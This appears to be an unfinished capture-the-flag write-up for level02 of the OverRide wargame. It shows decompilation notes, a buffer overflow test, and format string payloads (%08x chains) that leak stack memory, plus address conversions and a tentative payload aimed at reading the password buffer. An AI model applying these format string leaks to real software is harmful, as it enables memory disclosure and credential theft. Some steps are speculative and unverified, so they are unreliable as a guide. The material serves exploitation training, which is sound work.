### step 1: Decompile with Ghidra

C code is available in the `source` file  

### step 2: Code analysis

- Two buffers are filled with `stdin`
  - `buffer1[12]`
  - `buffer2[14]`

- A Username is asked a fill `buffer1`
- If we try to overflow `buffer1` with more than 12 chars, `buffer2` gets filled. Here is an example with only one long input :  

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
--[ Password: *****************************************
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA does not have access!
```

**But we don't get a segfault this way**  

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
--[ Password: *****************************************
AAAAffffe4f0.00000000.00000025.2a2a2a2a.2a2a2a2a.ffffe6e8.f7ff9a08.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.00000000. does not have access!
```
7838302530252e782e7838303830252e252e7838

0x400d22 = \x22\x0d\x40\x00
f7ff9a08 = \x08\x9a\xff\xf7
ffffe4f0 = \xf0\xe4\xff\xff
printf ("\x22\x0d\x40\x00_%08x.%08x.%08x.%08x.%08x|%s|")

Main variables stack starting Address : 0x7fffffffe5a0

Try `printf ("\x88\xe6\xff\xff_%08x.%08x.%08x.%08x.%08x|%s|")` with these stack addresses to print the content of `read_buffer` ?

